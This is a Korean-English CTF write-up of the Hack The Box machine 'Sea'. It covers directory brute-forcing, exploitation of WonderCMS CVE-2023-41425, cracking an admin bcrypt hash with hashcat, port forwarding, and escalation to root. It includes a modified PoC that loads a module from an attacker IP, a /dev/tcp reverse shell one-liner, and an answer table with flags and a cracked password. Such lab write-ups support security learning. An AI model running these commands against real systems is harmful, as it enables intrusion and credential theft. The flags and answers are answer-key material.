---
tags:
  - type/machine
  - platform/htb
  - status/unsolved
  - tech/lin/passwd-write
  - tech/web/xss
  - tech/cred/crack
  - tech/enum/dirbust
type: machine
platform: htb
ip: 10.129.66.148
domain: sea.htb
cves: [CVE-2023-41425]
status: unsolved
tech_count: 4
---
# Target IP

# 10.129.66.148


| Task                                                                                                                                        | Answer                           |
| ------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------- |
| [[#How many open TCP ports are listening on Sea?]]                                                                                          | 2                                |
| [[#In what language is the website on Sea written?]]                                                                                        | PHP                              |
| [[#What is the name of the content management system running the website on Sea?]]                                                          | WonderCMS                        |
| [[#What is the 2023 CVE ID for an unauthenticated cross site scripting vulnerability in WonderCMS that can lead to remote code execution?]] | CVE-2023-41425                   |
| [[#What system user on Sea is the website running as?]]                                                                                     | www-data                         |
| [[#What is the name of the file that holds the hash of the admin password for WonderCMS on Sea?]]                                           | database.js                      |
| [[#What is the amay user's password on Sea?]]                                                                                               | mychemicalromance                |
| [[#Submit the flag located in the amay user's home directory.]]                                                                             | f24724d3a05e60b586fecd3b44c722ca |
| [[#On what port is there a webserver listening only on localhost?]]                                                                         | 8080                             |
| [[#What HTTP POST parameter contains the path to a file when submitted from the System Monitor website?]]                                   | log_file                         |
| [[#What system user is the internal System Monitor website running as on Sea?]]                                                             | root                             |
| [[#Submit the flag located in the root user's home directory.]]                                                                             | f4978ac10342a57ed379d093fcca0728 |
## How many open TCP ports are listening on Sea?
![[Pasted image 20260119131053.png]]


## In what language is the website on Sea written?
Using BurpSuite, verify that the Set-cookie value in the Header is PHPSSESSID.

![[Pasted image 20260119131842.png]]

## What is the name of the content management system running the website on Sea?

Discovered themes/bike/

![[Pasted image 20260119134932.png]]

I brute-forced inside /themes/bike using dirsearch
dirsearch를 사용하여 /themes/bike 내부를 브루트포스 하였습니다
```bash
dirsearch -u http://10.129.66.148/themes/bike/
```
![[Pasted image 20260119140423.png]]

Use WonderCMS
WonderCMS 사용
![[Pasted image 20260119140511.png]]

## What is the 2023 CVE ID for an unauthenticated cross site scripting vulnerability in WonderCMS that can lead to remote code execution?

Searching google
![[Pasted image 20260119140820.png]]


## What system user on Sea is the website running as?


sea.htb/loginURL
![[Pasted image 20260119153210.png]]

CVE-2023-41425 POC 수정
```python
var urlWithoutLogBase = "http://sea.htb";
var urlRev = urlWithoutLogBase+"/?installModule=http://10.10.15.145:8000/main.zip&directoryName=violet&type=themes&token=" + token;
```

XSS script 입력
![[Pasted image 20260119152745.png]]

![[Pasted image 20260119153428.png]]
![[Pasted image 20260119153444.png]]

Shell 안정화
```bash
script /dev/null -c bash
```
![[Pasted image 20260119154757.png]]


## What is the name of the file that holds the hash of the admin password for WonderCMS on Sea?

```bash
grep -iR passw
```
![[Pasted image 20260119155220.png]]



## What is the amay user's password on Sea?

관리자 password 확인
![[Pasted image 20260120132724.png]]

hashcat 사용하여 패스워드 추출
```bash
echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q' > hash.txt
sed 's/\\//g' hash.txt > hash_fixed.txt
sudo hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20260120133118.png]]


## Submit the flag located in the amay user's home directory.


사용자 명 확인 후 획득한 password 입력
```bash
cat /etc/passwd | grep /bin/bash
```
![[Pasted image 20260120133734.png]]

Retrieve user.txt
![[Pasted image 20260120135548.png]]


## On what port is there a webserver listening only on localhost?
```bash
netstat -tunlnp
```
![[Pasted image 20260120135754.png]]


## What HTTP POST parameter contains the path to a file when submitted from the System Monitor website?

```bash
ssh amay@sea.htb -L 8080:127.0.0.1:8080
```
8080 포트 포트포워딩

![[Pasted image 20260120144006.png]]

![[Pasted image 20260120163349.png]]


## What system user is the internal System Monitor website running as on Sea?

![[Pasted image 20260120165716.png]]
root 권한으로 test.txt 파일 생성
![[Pasted image 20260120165751.png]]
## Submit the flag located in the root user's home directory.

```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.145 4444 0>%26%1'
```
![[Pasted image 20260120171626.png]]

![[Pasted image 20260120171954.png]]
# Walkthroughs ![[sea_htb 1.pdf]]